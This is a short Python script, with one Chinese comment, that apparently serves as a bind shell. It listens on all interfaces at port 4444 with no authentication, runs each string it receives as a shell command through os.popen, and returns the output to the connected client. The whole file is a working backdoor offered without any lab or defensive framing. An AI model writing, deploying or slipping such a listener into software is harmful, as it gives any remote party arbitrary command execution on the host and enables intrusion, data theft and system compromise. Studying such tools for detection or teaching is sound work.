import socket as s
import os

port = 4444 # 端口，可自行更改
con = ('0.0.0.0',port)

tcpServer = s.socket(s.AF_INET,s.SOCK_STREAM)
tcpServer.bind(con)
tcpServer.listen(5)


tcpClient,addr = tcpServer.accept()
tcpClient.send('connected!\n'.encode())

while True:
    raw = tcpClient.recv(4096).decode("utf-8")
    if raw == 'exit':
        break
    cmd = os.popen(raw)
    data = cmd.readlines()

    if data == []:
        data = 'error command'
    
    s = ''
    for i in data:
        s += i

    tcpClient.send(s.encode())

tcpClient.close()
tcpServer.close()